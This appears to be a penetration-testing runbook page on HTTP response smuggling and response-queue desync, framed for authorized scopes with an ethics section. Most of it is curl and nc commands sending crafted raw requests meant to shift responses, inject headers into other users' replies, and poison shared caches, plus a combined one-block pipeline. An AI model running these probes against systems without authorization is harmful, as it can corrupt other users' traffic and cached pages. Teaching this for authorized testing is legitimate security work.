---
title: "HTTP Response Smuggling / Desync"
description: "Exploit response queue desync to poison responses, inject headers, and leak data from other users."
phase: Web
order: 43
tags:
  - smuggling
  - desync
  - http
  - cache
tools:
  - burp suite
  - curl
updated: 2026-10-01
---

A runbook for testing **response smuggling / response queue desync** in an authorized scope. Goal: determine whether the backend can be made to emit bytes the front end splits into two responses, contaminating the next user's reply.

## 1. Understand the queue pairing

The front end matches one request to one response. If your request makes the backend produce extra content, the front end may treat the tail as the start of the next user's response.

```bash
curl -s -D - -o /dev/null https://target/ | grep -iE 'content-length|transfer-encoding|connection'
```

## 2. Detect shifted or prefixed responses

Send a request crafted to leave the backend mid-response, then observe the very next response on the same connection for injected headers or truncation.

```text
POST / HTTP/1.1
Host: target
Content-Length: <too short>

GET /poison HTTP/1.1
Host: target
```

```bash
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\n\r\nGET /poison HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80
```

## 3. Watch for residual bytes with a marker

Use a unique path or header as a marker. If it lands in a response that should not contain it, the queue desynced.

```bash
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\n\r\nSMUG' | nc target 80
curl -s -D - -o /dev/null https://target/ | grep -i 'SMUG\|x-injected'
```

## 4. Test header and status-line injection

Some desyncs let you inject a header or full status line into another user's response, which can set a cookie or force a redirect.

```bash
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 3\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\nX-Injected: yes\r\n\r\n' | nc target 80
```

## 5. Assess cache and redirect impact

If a shared cache stores the malformed response, a single poisoned entry can affect everyone. Check cache headers and whether the injected tail is cached.

```bash
curl -s -D - -o /dev/null https://target/ | grep -iE 'cache-control|age|x-cache|vary'
```

## 6. Confirm on your own connection only

Own both the sender and the observer. Keep proof to a single marker in a response that should not contain it, and never target third-party traffic.

## 7. Full pipeline (one block)

```bash
HOST=target
# baseline framing
curl -s -D - -o /dev/null "https://$HOST/" | grep -iE 'content-length|transfer-encoding'
# leave backend mid-response; observe the next reply
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n\r\nSMUG' "$HOST" | nc "$HOST" 80 | tee first.txt
printf 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' "$HOST" | nc "$HOST" 80 | tee second.txt
grep -i 'SMUG\|x-injected' first.txt second.txt
# header injection probe + cache check
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 3\r\n\r\nGET / HTTP/1.1\r\nHost: %s\r\nX-Injected: yes\r\n\r\n' "$HOST" "$HOST" | nc "$HOST" 80
curl -s -D - -o /dev/null "https://$HOST/" | grep -iE 'cache-control|x-cache|age'
```

## Ethics & legality

- Only test hosts in an official scope or with written authorization.
- Confirm desync only on connections you control; never poison live user traffic.
- Document the exact trigger and keep request/response evidence.
